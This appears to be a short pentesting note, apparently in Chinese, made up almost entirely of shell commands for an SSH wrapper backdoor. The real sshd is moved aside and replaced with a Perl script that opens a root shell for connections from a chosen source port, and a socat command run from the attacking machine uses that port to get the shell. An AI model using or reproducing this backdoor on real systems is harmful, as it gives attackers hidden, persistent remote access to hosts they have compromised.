	>cd /usr/sbin
	>mv sshd ../bin
	>echo '#!/usr/bin/perl' >sshd
	>echo 'exec "/bin/sh" if (getpeername(STDIN) =~ /^..4A/);' >>sshd
	>echo 'exec {"/usr/bin/sshd"} "/usr/sbin/sshd",@ARGV,' >>sshd
	>chmod u+x sshd
	>/etc/init.d/sshd restart
	攻击机执行
	>socat STDIO TCP4:192.168.0.110:22,sourceport=13377
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/572.png)